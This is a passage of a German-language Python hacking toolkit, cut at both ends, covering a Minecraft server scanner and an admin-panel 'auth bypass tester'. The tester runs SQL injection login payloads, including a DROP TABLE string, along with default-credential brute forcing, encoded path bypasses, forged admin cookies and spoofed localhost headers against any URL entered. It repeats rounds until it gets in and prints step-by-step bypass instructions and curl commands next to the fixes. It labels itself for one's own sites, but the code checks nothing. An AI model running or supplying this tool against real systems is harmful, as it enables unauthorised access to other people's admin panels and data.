        ("Essentials",    r'(?i)essentials', "CVE-2021-XXXX: /nick Bypass möglich in <2.19"),
        ("WorldEdit",     r'(?i)worldedit',  "Heap-Dump via //calc in alten Versionen"),
        ("LuckPerms",     r'(?i)luckperms',  "Keine bekannte kritische Vuln — aktuell halten"),
        ("Vault",         r'(?i)vault',       "API-Exposition — Abhängigkeiten prüfen"),
        ("AuthMe",        r'(?i)authme',      "Brute-Force auf /login möglich (Rate-Limit prüfen)"),
        ("ProtocolLib",   r'(?i)protocollib', "Packet-Manipulation möglich wenn veraltet"),
        ("PermissionsEx", r'(?i)permissionsex|pex', "EOL-Plugin — zu LuckPerms wechseln"),
        ("BungeeCord",    r'(?i)bungeecord|bungee',  "IP-Forwarding muss aktiviert sein + firewall"),
        ("Waterfall",     r'(?i)waterfall',   "IP-Forwarding — backend direkt erreichbar?"),
        ("Velocity",      r'(?i)velocity',    "Modern Forwarding prüfen (forwarding.secret)"),
    ]
    plugin_hits = False
    for pname, pat, note in PLUGIN_SIGS:
        if re.search(pat, motd_ver_str):
            print(f"  {DG}║{R}  {YG}[PLUGIN]{R}  {YG}{pname:<16}{R}  {DIM}{note}{R}")
            findings.append(("WARN", pname, note))
            plugin_hits = True
    if not plugin_hits:
        print(f"  {DG}║{R}  {DIM}Keine Plugins via MOTD/Version erkennbar{R}")

    print(f"  {DG}╠{'═'*W}╣{R}")
    print(f"  {DG}║{R}  {C}── NETZWERK & KONFIGURATION ──{R}")

    # Query-Port testen (UDP 25565) — verrät Software-Version
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        magic = b'\xfe\xfd'
        s.sendto(magic + b'\x09' + b'\x00'*4, (host, port))
        data, _ = s.recvfrom(4096)
        s.close()
        if data:
            findings.append(("WARN","UDP Query offen","Server-Info via UDP abfragbar"))
            print(f"  {DG}║{R}  {YG}⚠ UDP Query Port offen — leakt Server-Info{R}")
    except Exception:
        print(f"  {DG}║{R}  {G}✓ UDP Query Port geschlossen{R}")

    # Rcon Port (25575) testen
    try:
        s = socket.socket()
        s.settimeout(2)
        r = s.connect_ex((host, 25575))
        s.close()
        if r == 0:
            findings.append(("KRIT","RCON Port offen","Port 25575 erreichbar — Brute-Force möglich!"))
            print(f"  {DG}║{R}  {RED}✗ RCON Port 25575 erreichbar — GEFÄHRLICH!{R}")
        else:
            print(f"  {DG}║{R}  {G}✓ RCON Port geschlossen{R}")
    except Exception:
        print(f"  {DG}║{R}  {G}✓ RCON Port nicht erreichbar{R}")

    # Online-Mode (Cracked?)
    # Wir versuchen Login-Packet mit einem Fake-UUID
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((host, port))
        hs  = _varint(0x00)
        hs += _varint(47)
        hs += _varint(len(host.encode())) + host.encode()
        hs += port.to_bytes(2, "big")
        hs += _varint(2)
        s.send(_mk_packet(0x00, hs))
        name = b"TestPlayer123"
        s.send(_mk_packet(0x00, _varint(len(name)) + name))
        resp = s.recv(256)
        s.close()
        if resp:
            # Wenn Encryption-Request → online mode
            # Wenn direkt Login-Success oder Disconnect → offline mode
            pid_byte = resp[1] if len(resp) > 1 else 0
            if pid_byte == 0x01:
                print(f"  {DG}║{R}  {G}✓ Online-Mode aktiv (Encryption-Request empfangen){R}")
            elif pid_byte == 0x02:
                findings.append(("KRIT","Offline-Mode","Login ohne Mojang-Auth — Cracked-Server!"))
                print(f"  {DG}║{R}  {RED}✗ Offline-Mode — kein Auth! Cracked-Server{R}")
            else:
                print(f"  {DG}║{R}  {DIM}Auth-Mode unbekannt (Packet-ID: 0x{pid_byte:02x}){R}")
    except Exception:
        print(f"  {DG}║{R}  {DIM}Auth-Mode: Verbindung getrennt (normal){R}")

    # Zusammenfassung
    print(f"  {DG}╠{'═'*W}╣{R}")
    crits = sum(1 for fsev,_fn,_fd in findings if fsev=="KRIT")
    warns = sum(1 for fsev,_fn,_fd in findings if fsev=="WARN")
    col = RED if crits > 0 else YG if warns > 0 else G
    print(f"  {DG}║{R}  {col}Ergebnis: {crits} kritisch · {warns} Warnungen{R}")
    if findings:
        print(f"  {DG}╠{'═'*W}╣{R}")
        print(f"  {DG}║{R}  {C}── EMPFEHLUNGEN ──{R}")
        tips = {
            "RCON Port offen":    "RCON deaktivieren oder auf 127.0.0.1 binden (server.properties)",
            "Offline-Mode":       "online-mode=true in server.properties setzen",
            "UDP Query offen":    "enable-query=false in server.properties",
            "Player-Liste":       "hide-online-players=true oder max-players=0 in server.properties",
        }
        for fsev, fname, fdetail in findings:
            tip = tips.get(fname, "Plugin/Server aktualisieren")
            col = RED if fsev=="KRIT" else YG
            print(f"  {DG}║{R}  {col}→{R}  {DIM}{fname}: {tip[:55]}{R}")

    print(f"  {DG}╚{'═'*W}╝{R}")
    wait()



# ── 116  ADMIN AUTH BYPASS TESTER ────────────────────────────────────────────
def admin_auth_bypass():
    RED  = "\033[91m"; BRED = "\033[1;91m"
    hdr("ADMIN AUTH BYPASS TESTER")
    print(f"  {DIM}Testet Auth-Bypässe auf Admin-Panels — nur auf eigene Seiten!{R}\n")

    url = inp("Admin-Panel URL (z.B. https://example.com/admin)")
    if not url: wait(); return
    if not url.startswith("http"): url = "https://" + url
    url = url.rstrip("/")

    login_url = inp(f"Login-URL [{url}/login]") or url + "/login"
    if not login_url.startswith("http"): login_url = url + "/" + login_url.lstrip("/")

    u_field = inp("Benutzername-Feld [username]") or "username"
    p_field = inp("Passwort-Feld [password]")     or "password"

    W = 74
    hits = []

    def _req(target, method="GET", data=None, hdrs=None, cookies=None, timeout=7):
        h = {"User-Agent": "Mozilla/5.0", "Accept": "text/html,*/*"}
        if cookies:
            h["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())
        if hdrs:
            h.update(hdrs)
        try:
            bd = urllib.parse.urlencode(data).encode() if isinstance(data, dict) else (data or None)
            if bd and "Content-Type" not in h:
                h["Content-Type"] = "application/x-www-form-urlencoded"
            req = urllib.request.Request(target, data=bd, method=method, headers=h)
            import ssl as _ssl
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read(16384).decode(errors="ignore")
                return r.status, dict(r.headers), body, r.url
        except urllib.error.HTTPError as e:
            try: body = e.read(8192).decode(errors="ignore")
            except: body = ""
            return e.code, dict(e.headers), body, target
        except Exception as ex:
            return 0, {}, str(ex), target

    # Baseline-Body holen für Vergleich
    try:
        _bl_req = urllib.request.Request(login_url, headers={"User-Agent":"Mozilla/5.0"})
        import ssl as _sslb; _ctxb = _sslb.create_default_context()
        _ctxb.check_hostname = False; _ctxb.verify_mode = _sslb.CERT_NONE
        with urllib.request.urlopen(_bl_req, timeout=6, context=_ctxb) as _r:
            _baseline_body = _r.read(16384).decode(errors="ignore").lower()
            _baseline_url  = _r.geturl()
    except Exception:
        _baseline_body = ""; _baseline_url = login_url

    def _is_success(status, body, final_url):
        body_low = body.lower()
        # Sofort raus wenn gleicher Body wie Login-Seite (False Positive)
        if len(body_low) > 100 and body_low[:300] == _baseline_body[:300]:
            return False
        # Sofort raus wenn zur Login-URL weitergeleitet
        if "login" in final_url.lower() or final_url.rstrip("/") == login_url.rstrip("/"):
            return False
        # Muss 200 sein (302 allein reicht nicht — könnte Redirect zu Login sein)
        if status != 200:
            return False
        login_words = ["login","passwort","password","sign in","unauthorized",
                       "access denied","forbidden","invalid","wrong","error",
                       "enter your","bitte einloggen","anmelden","log in",
                       "username","benutzername"]
        admin_words = ["dashboard","logout","willkommen","welcome","admin panel",
                       "user list","settings","configuration","manage","overview",
                       "abmelden","benutzer","statistik","panel"]
        has_login = any(w in body_low for w in login_words)
        has_admin = any(w in body_low for w in admin_words)
        # Nur als Erfolg werten wenn Admin-Wörter vorhanden UND keine Login-Wörter
        return has_admin and not has_login

    # ── Payload-Listen ────────────────────────────────────────
    SQLI_PAYLOADS = [
        ("' OR '1'='1",                 "' OR '1'='1"),
        ("admin'--",                     "x"),
        ("' OR 1=1--",                   "x"),
        ("admin'/*",                     "x"),
        ("' OR 'x'='x",                 "' OR 'x'='x"),
        ("1' OR '1'='1'--",             "x"),
        ("') OR ('1'='1",               "') OR ('1'='1"),
        ("\" OR \"\"=\"",              "\" OR \"\"=\""),
        ("admin\" --",                   "x"),
        ("' OR 1=1#",                   "x"),
        ("' OR '1'='1'--",              "x"),
        ("' OR '1'='1'/*",              "x"),
        ("') OR '1'='1'--",             "x"),
        ("' OR 1=1 LIMIT 1--",          "x"),
        ("admin') --",                   "x"),
        ("' UNION SELECT 1,1--",        "x"),
        ("' UNION SELECT null,null--",  "x"),
        ("1 OR 1=1",                    "1 OR 1=1"),
        ("1' OR '1",                    "1"),
        ("\" OR 1=1--",                 "x"),
        ("\" OR \"1\"=\"1",            "x"),
        ("' OR ''='",                   "' OR ''='"),
        ("' OR 1 --",                   "x"),
        ("or 1=1",                      "or 1=1"),
        ("' OR 'unusual'='unusual",     "' OR 'unusual'='unusual"),
        ("admin' #",                    "x"),
        ("' OR 1=1/*",                  "x"),
        ("') OR ('1'='1'--",           "x"),
        ("\" OR \"\"=\"\"--",          "x"),
        ("1' OR 1=1--",                 "x"),
        ("' OR sleep(1)--",             "x"),
        ("\" OR sleep(1)--",            "x"),
        ("1; DROP TABLE users--",       "x"),
        ("' AND 1=1--",                 "x"),
        ("' AND '1'='1",                "x"),
        ("%27 OR %271%27%3D%271",       "x"),
        ("' OR 1=1 --+",                "x"),
        ("' OR 1=1;--",                 "x"),
        ("admin'%23",                   "x"),
        ("' OR/**/1=1--",               "x"),
    ]

    DEFAULT_CREDS = [
        ("admin","admin"),("admin","password"),("admin","123456"),
        ("admin","admin123"),("admin",""),("admin","pass"),
        ("admin","1234"),("admin","12345"),("admin","123"),
        ("admin","password123"),("admin","admin@123"),
        ("admin","letmein"),("admin","qwerty"),("admin","abc123"),
        ("admin","welcome"),("admin","monkey"),("admin","dragon"),
        ("admin","master"),("admin","login"),("admin","test"),
        ("admin","root"),("admin","toor"),("admin","000000"),
        ("admin","111111"),("admin","123123"),("admin","superman"),
        ("administrator","administrator"),("administrator","password"),
        ("administrator","admin"),("administrator","123456"),
        ("root","root"),("root","toor"),("root","password"),
        ("root","123456"),("root",""),
        ("test","test"),("test","password"),("test","123456"),
        ("user","user"),("user","password"),("user","123456"),
        ("guest","guest"),("guest","password"),("guest",""),
        ("demo","demo"),("demo","password"),
        ("manager","manager"),("manager","password"),
        ("superadmin","superadmin"),("superadmin","password"),
        ("sysadmin","sysadmin"),("sysadmin","password"),
        ("webadmin","webadmin"),("webmaster","webmaster"),
        ("info","info"),("support","support"),("service","service"),
        ("operator","operator"),("staff","staff"),
        ("admin","P@ssw0rd"),("admin","Admin123!"),
        ("admin","changeme"),("admin","default"),
        ("admin","admin1234"),("admin","admin2024"),
        ("admin","admin2025"),("admin","admin2026"),
        ("admin","password1"),("admin","Password1"),
        ("admin","Admin1234"),("admin","qwerty123"),
        ("admin","pass123"),("admin","pass1234"),
        ("admin","iloveyou"),("admin","trustno1"),
        ("admin","sunshine"),("admin","666666"),("admin","654321"),
    ]

    base = url.split("/admin")[0] if "/admin" in url else url
    URL_PATHS = [
        url+"/dashboard",    url+"/users",         url+"/settings",
        url+"/config",       url+"/panel",         url+"/manage",
        url+"/index",        url+"/home",          url+"/main",
        url+"/overview",     url+"/control",       url+"/cp",
        url+"/backend",      url+"/system",        url+"/console",
        url+"/?auth=1",      url+"/?admin=true",   url+"/?bypass=1",
        url+"/?debug=true",  url+"/?access=admin", url+"/?logged=1",
        url+"/?..",          url+"/%2e%2e",
        url+"/..;/",         url+"/;/",
        url+"/%09",          url+"/./",            url+"//",
        base+"/admin",       base+"/administrator",
        base+"/wp-admin",    base+"/phpmyadmin",
        base+"/admin/index.php", base+"/admin/login.php",
        base+"/adminpanel",  base+"/admin_panel",
        base+"/admin-panel", base+"/manage",
        base+"/management",  base+"/backend",
        base+"/controlpanel",base+"/cp",
        base+"/dashboard",   base+"/console",
        base+"/system",      base+"/sysadmin",
        base+"/webadmin",    base+"/adminer.php",
        url+"/%61dmin",      url+"/adm%69n",
        url+"//dashboard",   url+"/./dashboard",
        base+"/ADMIN",       base+"/Admin",
        base+"/admin%2F",
        url.replace("https://","http://"),
    ]

    COOKIE_SETS = [
        {"isAdmin":"true"},{"admin":"true"},{"role":"admin"},
        {"user":"admin"},{"auth":"1"},{"authenticated":"true"},
        {"isAdmin":"1","role":"admin"},{"session":"admin"},
        {"logged_in":"true","role":"administrator"},{"access_level":"99"},
        {"is_admin":"1"},{"admin_user":"1"},{"privilege":"admin"},
        {"level":"admin"},{"type":"admin"},{"group":"admin"},
        {"permissions":"admin"},{"usertype":"admin"},{"rank":"admin"},
        {"isLoggedIn":"true","role":"admin"},
        {"token":"admin"},{"key":"admin"},{"secret":"admin"},
        {"auth":"admin"},{"access":"admin"},{"rights":"admin"},
        {"admin_auth":"1"},{"admin_session":"1"},{"admin_token":"1"},
        {"isAdministrator":"true"},{"administrator":"true"},
        {"superuser":"true"},{"root":"true"},{"su":"1"},
    ]

    HEADER_SETS = [
        {"X-Original-URL":"/admin"},
        {"X-Rewrite-URL":"/admin"},
        {"X-Custom-IP-Authorization":"127.0.0.1"},
        {"X-Forwarded-For":"127.0.0.1"},
        {"X-Remote-IP":"127.0.0.1"},
        {"X-Client-IP":"127.0.0.1"},
        {"X-Host":"localhost"},
        {"X-Forwarded-Host":"localhost"},
        {"X-Admin":"true"},
        {"X-Auth-Token":"admin"},
        {"X-Forwarded-For":"localhost"},
        {"X-Forwarded-For":"0.0.0.0"},
        {"X-Real-IP":"127.0.0.1"},
        {"X-Originating-IP":"127.0.0.1"},
        {"X-Remote-Addr":"127.0.0.1"},
        {"Client-IP":"127.0.0.1"},
        {"True-Client-IP":"127.0.0.1"},
        {"X-ProxyUser-Ip":"127.0.0.1"},
        {"X-Original-URL":"/admin/dashboard"},
        {"X-Rewrite-URL":"/admin/dashboard"},
        {"X-Override-URL":"/admin"},
        {"X-Forwarded-Server":"localhost"},
        {"X-Original-Host":"localhost"},
        {"Forwarded":"for=127.0.0.1;host=localhost;proto=https"},
        {"X-Admin-Auth":"1"},
        {"Authorization":"Basic YWRtaW46YWRtaW4="},
        {"Authorization":"Basic YWRtaW46cGFzc3dvcmQ="},
        {"X-Auth":"admin"},
        {"X-API-Key":"admin"},
        {"X-Token":"admin"},
        {"X-Access-Token":"admin"},
    ]

    # ── Scan-Loop (läuft bis Bypass gefunden oder Ctrl+C) ─────
    round_num = 0
    found_any = False

    print(f"\n  {DG}╔{'═'*W}╗{R}")
    print(f"  {DG}║{R}{_pad(f'  {YG}ADMIN AUTH BYPASS — {url[:40]}{R}', W)}{DG}║{R}")
    print(f"  {DG}║{R}  {DIM}Läuft bis Bypass gefunden — Ctrl+C zum Stoppen{R}")

    try:
      while not found_any:
        round_num += 1
        print(f"  {DG}╠{'═'*W}╣{R}")
        print(f"  {DG}║{R}  {C}RUNDE {round_num}{R}  {DIM}({'Deep-Scan' if round_num>1 else 'Standard-Scan'}){R}")

        # ── 0. Direktzugriff ──────────────────────────────
        print(f"  {DG}╠{'═'*W}╣{R}")
        print(f"  {DG}║{R}  {C}[0] Panel direkt{R}")
        b_sc, b_hdrs, b_body, b_url = _req(url)
        if _is_success(b_sc, b_body, b_url):
            hits.append(("KRIT","Panel direkt erreichbar",url,f"HTTP {b_sc}"))
            print(f"  {DG}║{R}  {RED}✗ Panel direkt zugänglich! HTTP {b_sc}{R}")
            found_any = True
        else:
            print(f"  {DG}║{R}  {G}✓ Panel erfordert Auth (HTTP {b_sc}){R}")

        # ── 1. SQLi ──────────────────────────────────────
        print(f"  {DG}╠{'═'*W}╣{R}")
        print(f"  {DG}║{R}  {C}[1] SQLi — {len(SQLI_PAYLOADS)} Payloads{R}")
        sqli_found = False
        for usr_pay, pw_pay in SQLI_PAYLOADS:
            sc, hdrs, body, final = _req(login_url, method="POST",
                data={u_field:usr_pay, p_field:pw_pay})
            if _is_success(sc, body, final):
                hits.append(("KRIT","SQLi Bypass",f"{u_field}={usr_pay}",f"HTTP {sc}"))
                print(f"  {DG}║{R}  {RED}✗ SQLi BYPASS! {u_field}={usr_pay[:35]}{R}")
                sqli_found = True; found_any = True; break
            time.sleep(0.05)
        if not sqli_found:
            print(f"  {DG}║{R}  {G}✓ SQLi: nichts gefunden{R}")

        # ── 2. Default Credentials ────────────────────────
        print(f"  {DG}╠{'═'*W}╣{R}")
        print(f"  {DG}║{R}  {C}[2] Credentials — {len(DEFAULT_CREDS)} Kombinationen{R}")
        cred_found = False
        for usr, pw in DEFAULT_CREDS:
            sc, hdrs, body, final = _req(login_url, method="POST",
                data={u_field:usr, p_field:pw})
            if _is_success(sc, body, final):
                hits.append(("KRIT","Default Credentials",f"{usr}:{pw}",f"HTTP {sc}"))
                print(f"  {DG}║{R}  {RED}✗ CREDS FUNKTIONIEREN! {usr}:{pw}{R}")
                cred_found = True; found_any = True; break
            time.sleep(0.05)
        if not cred_found:
            print(f"  {DG}║{R}  {G}✓ Credentials: nichts gefunden{R}")

        # ── 3. URL-Bypass ────────────────────────────────
        print(f"  {DG}╠{'═'*W}╣{R}")
        print(f"  {DG}║{R}  {C}[3] URL-Bypass — {len(URL_PATHS)} Pfade{R}")
        url_found = False
        for test_url in URL_PATHS:
            sc, hdrs, body, final = _req(test_url)
            if _is_success(sc, body, final):
                hits.append(("KRIT","URL-Bypass",test_url,f"HTTP {sc}"))
                print(f"  {DG}║{R}  {RED}✗ DIREKTZUGRIFF! {test_url[:55]}{R}")
                url_found = True; found_any = True
            time.sleep(0.04)
        if not url_found:
            print(f"  {DG}║{R}  {G}✓ URL-Bypass: nichts gefunden{R}")

        # ── 4. Cookie-Forgery ────────────────────────────
        print(f"  {DG}╠{'═'*W}╣{R}")
        print(f"  {DG}║{R}  {C}[4] Cookie — {len(COOKIE_SETS)} Sets{R}")
        cookie_found = False
        for cookies in COOKIE_SETS:
            sc, hdrs, body, final = _req(url, cookies=cookies)
            if _is_success(sc, body, final):
                ck_str = "; ".join(f"{k}={v}" for k,v in cookies.items())
                hits.append(("KRIT","Cookie-Forgery",ck_str,f"HTTP {sc}"))
                print(f"  {DG}║{R}  {RED}✗ COOKIE-BYPASS! {ck_str[:50]}{R}")
                cookie_found = True; found_any = True; break
            time.sleep(0.04)
        if not cookie_found:
            print(f"  {DG}║{R}  {G}✓ Cookie: nichts gefunden{R}")

        # ── 5. Header-Bypass ─────────────────────────────
        print(f"  {DG}╠{'═'*W}╣{R}")
        print(f"  {DG}║{R}  {C}[5] Header — {len(HEADER_SETS)} Varianten{R}")
        header_found = False
        for extra_hdrs in HEADER_SETS:
            sc, hdrs, body, final = _req(url, hdrs=extra_hdrs)
            if _is_success(sc, body, final):
                h_str = list(extra_hdrs.items())[0]
                hits.append(("KRIT","Header-Bypass",f"{h_str[0]}: {h_str[1]}",f"HTTP {sc}"))
                print(f"  {DG}║{R}  {RED}✗ HEADER-BYPASS! {h_str[0]}: {h_str[1]}{R}")
                header_found = True; found_any = True; break
            time.sleep(0.04)
        if not header_found:
            print(f"  {DG}║{R}  {G}✓ Header: nichts gefunden{R}")

        # ── 6. HTTP Method ───────────────────────────────
        print(f"  {DG}╠{'═'*W}╣{R}")
        print(f"  {DG}║{R}  {C}[6] HTTP Methoden{R}")
        method_found = False
        for method in ["HEAD","OPTIONS","PUT","PATCH","TRACE","DELETE","CONNECT"]:
            sc, hdrs, body, final = _req(url, method=method)
            if sc == 200 and "login" not in final.lower():
                hits.append(("WARN",f"HTTP {method}",url,f"HTTP {sc}"))
                print(f"  {DG}║{R}  {YG}⚠ {method}: HTTP {sc}{R}")
                method_found = True; found_any = True
            time.sleep(0.03)
        if not method_found:
            print(f"  {DG}║{R}  {G}✓ Methoden: nichts gefunden{R}")

        if not found_any:
            print(f"  {DG}╠{'═'*W}╣{R}")
            print(f"  {DG}║{R}  {YG}Runde {round_num} abgeschlossen — nichts gefunden. Neue Runde...{R}")
            print(f"  {DG}║{R}  {DIM}(Ctrl+C zum Stoppen){R}")
            if round_num == 1:
                SQLI_PAYLOADS += [
                    ("\\'  OR \\'1\\'=\\'1", "x"),
                    ("' OR 1=1 --+",         "x"),
                    ("' OR 1=1;--",          "x"),
                    ("\" OR 1=1#",           "x"),
                    ("' OR/**/1=1--",        "x"),
                ]
                DEFAULT_CREDS += [
                    ("admin","Admin@2024"),("admin","Admin@2025"),
                    ("admin","Admin@2026"),("admin","@dmin123"),
                    ("admin","Adm1n!"),("admin","adm1n"),
                    ("admin","nimda"),("admin","aDmIn"),
                ]
                URL_PATHS += [
                    url+"/../admin/dashboard",
                    base+"/aDmIn",  base+"/adMIN",
                    base+"/AdMiN",
                ]
            time.sleep(1)

    except KeyboardInterrupt:
        print(f"\n  {DG}║{R}  {YG}Scan durch Benutzer gestoppt (Ctrl+C){R}")

    # ── BERICHT ───────────────────────────────────────────────
    from datetime import datetime as _dt
    crits = sum(1 for s,_n,_p,_d in hits if s=="KRIT")
    warns = sum(1 for s,_n,_p,_d in hits if s=="WARN")

    # (ursache, schritt_fuer_schritt_anleitung, fix)
    FIXES = {
        "Panel direkt erreichbar": (
            "Kein Auth-Check — Admin-Seiten sind ohne Login direkt aufrufbar.",
            [
                "1. Öffne deinen Browser.",
                f"2. Rufe direkt auf: {url}",
                "3. Du landest im Admin-Panel ohne Login-Seite zu sehen.",
                "4. Du hast vollen Zugriff auf alle Admin-Funktionen.",
            ],
            [
                "Jede Admin-Seite muss am Anfang den Login prüfen:",
                "  PHP-Beispiel (oben in jeder admin/*.php einfügen):",
                "    session_start();",
                "    if (empty($_SESSION['admin'])) {",
                "        header('Location: /login.php');",
                "        exit();",
                "    }",
                "  Oder eine Middleware für alle /admin/* Routen:",
                "    Express.js: app.use('/admin', requireAuth);",
                "    Laravel:    Route::middleware('auth')->group(...);",
            ]
        ),
        "SQLi Bypass": (
            "Das Login-Formular baut Benutzereingaben direkt in SQL ein — ohne Filterung.",
            [
                "1. Öffne das Login-Formular im Browser.",
                f"2. Gib im Benutzername-Feld ein:  ' OR '1'='1",
                "3. Gib im Passwort-Feld ein:       ' OR '1'='1",
                "4. Klicke auf Login.",
                "5. Der Server führt dann folgende SQL aus:",
                "   SELECT * FROM users WHERE user='' OR '1'='1' AND pass='' OR '1'='1'",
                "6. Da '1'='1' immer wahr ist, gibt die Abfrage ALLE User zurück.",
                "7. Du bist eingeloggt als der erste User in der DB — meistens admin.",
                "",
                "Alternative Payloads die auch funktionieren:",
                "   Benutzername:  admin'--",
                "   Passwort:      (egal, wird durch -- auskommentiert)",
            ],
            [
                "Prepared Statements verwenden — Eingaben werden NIEMALS als SQL ausgeführt:",
                "  PHP (PDO):",
                "    $stmt = $pdo->prepare(",
                "        'SELECT * FROM users WHERE username=? AND password=?'",
                "    );",
                "    $stmt->execute([$_POST['user'], hash('sha256',$_POST['pass'])]);",
                "  Python (MySQL):",
                "    cursor.execute(",
                "        'SELECT * FROM users WHERE user=%s AND pass=%s',",
                "        (username, password)",
                "    )",
                "  Node.js (MySQL2):",
                "    db.execute('SELECT * FROM users WHERE user=? AND pass=?', [u, p])",
                "",
                "NIEMALS: 'SELECT * FROM users WHERE user=' + username + '...'",
            ]
        ),
        "Default Credentials": (
            "Das Standard-Passwort (admin/admin etc.) wurde nach der Installation nie geändert.",
            [
                "1. Öffne das Login-Formular.",
                f"2. Gib als Benutzername ein: admin",
                f"3. Gib als Passwort ein:     admin  (oder password / 123456)",
                "4. Klicke Login — du bist drin.",
                "",
                "Warum funktioniert das?",
                "Viele CMS / Frameworks setzen beim Setup admin/admin als Standard.",
                "Wird es nicht geändert, kann jeder der die URL kennt rein.",
            ],
            [
                "Sofort tun:",
                "  1. Passwort JETZT ändern — min. 16 Zeichen, Groß/Klein/Zahlen/Sonderzeichen",
                "  2. Benutzernamen 'admin' umbenennen (z.B. zu einem eigenen Namen)",
                "  3. 2FA aktivieren (Google Authenticator / Authy)",
                "",
                "Beim nächsten Deployment erzwingen:",
                "  • Beim ersten Login Passwort-Änderung verlangen",
                "  • Passwort-Policy einbauen: min. 12 Zeichen, Komplexität prüfen",
                "  • Default-Accounts beim Setup deaktivieren oder umbenennen",
            ]
        ),
        "URL-Bypass": (
            "Admin-Unterseiten haben keinen eigenen Auth-Check — nur die Hauptseite prüft den Login.",
            [
                "1. Öffne deinen Browser ohne eingeloggt zu sein.",
                f"2. Rufe direkt eine Admin-Unterseite auf, z.B.:",
                f"   {url}/dashboard",
                f"   {url}/users",
                f"   {url}?admin=true",
                "3. Die Seite lädt ohne Login-Weiterleitung.",
                "4. Du siehst Admin-Inhalte obwohl du nicht angemeldet bist.",
                "",
                "Warum?  Die Hauptseite /admin prüft den Login,",
                "aber /admin/dashboard hat keinen eigenen Check.",
            ],
            [
                "Auth-Check in JEDER Seite/Route — nicht nur auf der Hauptseite:",
                "  PHP — oben in jede Datei:",
                "    require_once 'auth_check.php';  // enthält session check",
                "",
                "  auth_check.php:",
                "    <?php",
                "    session_start();",
                "    if (!isset($_SESSION['user_role']) || $_SESSION['user_role'] !== 'admin') {",
                "        http_response_code(403);",
                "        header('Location: /login');",
                "        exit();",
                "    }",
                "",
                "  Express.js — Middleware für alle Routen:",
                "    app.use('/admin', (req,res,next) => {",
                "        if (!req.session.isAdmin) return res.redirect('/login');",
                "        next();",
                "    });",
            ]
        ),
        "Cookie-Forgery": (
            "Der Server liest isAdmin/role aus dem Cookie — ohne zu prüfen ob der Wert manipuliert wurde.",
            [
                "1. Öffne das Admin-Panel im Browser (du wirst zu /login weitergeleitet).",
                "2. Öffne die Browser-DevTools (F12) → Reiter 'Application' → Cookies.",
                "3. Erstelle einen neuen Cookie:",
                "   Name:  isAdmin   Wert: true",
                "   (oder: Name: role   Wert: admin)",
                "4. Lade die Seite neu.",
                "5. Der Server liest $_COOKIE['isAdmin'] === 'true' und gibt Zugang.",
                "",
                "Alternativ mit curl:",
                f"   curl -b 'isAdmin=true; role=admin' {url}",
            ],
            [
                "Niemals Auth-State aus dem Cookie lesen — nur aus der serverseitigen Session:",
                "",
                "  PHP — FALSCH:",
                "    if ($_COOKIE['isAdmin'] === 'true') { ... }  // gefährlich!",
                "",
                "  PHP — RICHTIG:",
                "    session_start();",
                "    if ($_SESSION['role'] === 'admin') { ... }   // sicher",
                "",
                "  Node.js — FALSCH:",
                "    if (req.cookies.isAdmin === 'true') { ... }",
                "",
                "  Node.js — RICHTIG:",
                "    if (req.session.role === 'admin') { ... }",
                "",
                "  Sessions werden serverseitig gespeichert — der User kann sie nicht fälschen.",
            ]
        ),
        "Header-Bypass": (
            "Der Server vertraut HTTP-Headern wie X-Forwarded-For oder X-Original-URL die jeder setzen kann.",
            [
                "1. Sende einen HTTP-Request an das Admin-Panel mit einem manipulierten Header.",
                "2. Mit curl (Kommandozeile):",
                f"   curl -H 'X-Forwarded-For: 127.0.0.1' {url}",
                f"   curl -H 'X-Original-URL: /admin' {url}",
                f"   curl -H 'X-Admin: true' {url}",
                "3. Der Server denkt: 'Anfrage kommt von 127.0.0.1 (localhost) = vertrauenswürdig'",
                "4. oder: 'X-Admin: true gesetzt = Admin-Zugang erlaubt'",
                "5. Zugang wird gewährt ohne echtes Login.",
            ],
            [
                "Proxy-Header nur von vertrauenswürdigen IPs akzeptieren:",
                "",
                "  nginx — X-Forwarded-For nur vom eigenen Load-Balancer:",
                "    set_real_ip_from 10.0.0.1;  # IP deines Load-Balancers",
                "    real_ip_header X-Forwarded-For;",
                "",
                "  Niemals eigene Header (X-Admin, X-Auth) für Auth nutzen:",
                "    // FALSCH:",
                "    if (req.headers['x-admin'] === 'true') { grantAccess(); }",
                "",
                "  PHP — gefährliche Header filtern:",
                "    $trusted_proxies = ['10.0.0.1'];",
                "    if (!in_array($_SERVER['REMOTE_ADDR'], $trusted_proxies)) {",
                "        unset($_SERVER['HTTP_X_FORWARDED_FOR']);",
                "    }",
            ]
        ),
        "HTTP METHOD": (
            "Die Seite erlaubt HTTP-Methoden (HEAD/PUT/PATCH) die nicht blockiert sind und Zugang geben.",
            [
                "1. Sende statt GET einen anderen HTTP-Request an das Admin-Panel.",
                "2. Mit curl:",
                f"   curl -X HEAD {url}   → gibt HTTP 200 zurück",
                f"   curl -X PUT  {url}   → gibt HTTP 200 zurück",
                "3. Manche Frameworks überspringen Auth-Middleware bei unbekannten Methoden.",
                "4. Oder: OPTIONS gibt alle erlaubten Methoden zurück → Info-Leak.",
            ],
            [
                "Alle Routen auf erlaubte Methoden beschränken:",
                "",
                "  nginx:",
                "    location /admin {",
                "        limit_except GET POST { deny all; }",
                "    }",
                "",
                "  Express.js — explizit nur GET/POST erlauben:",
                "    router.get('/admin', authMiddleware, adminHandler);",
                "    router.post('/admin', authMiddleware, adminHandler);",
                "    // NICHT: router.all('/admin', ...) — erlaubt alle Methoden",
                "",
                "  Apache .htaccess:",
                "    <LimitExcept GET POST>",
                "        Deny from all",
                "    </LimitExcept>",
            ]
        ),
    }

    # ── ABSCHLIESSENDER BERICHT ───────────────────────────────
    _ts  = _dt.now().strftime("%d.%m.%Y %H:%M")
    _tsf = _dt.now().strftime("%Y%m%d_%H%M%S")
    crits = sum(1 for s,_n,_p,_d in hits if s=="KRIT")
    warns = sum(1 for s,_n,_p,_d in hits if s=="WARN")

    # Ersten kritischen Fund als "Haupt-Bypass" nehmen
    main_hit = next(((s,t,p,d) for s,t,p,d in hits if s=="KRIT"), None)
    if not main_hit:
        main_hit = next(((s,t,p,d) for s,t,p,d in hits if s=="WARN"), None)

    def _fix_key(typ):
        for k in FIXES:
            if k.lower() in typ.lower() or typ.lower() in k.lower():
                return k
        for k in FIXES:
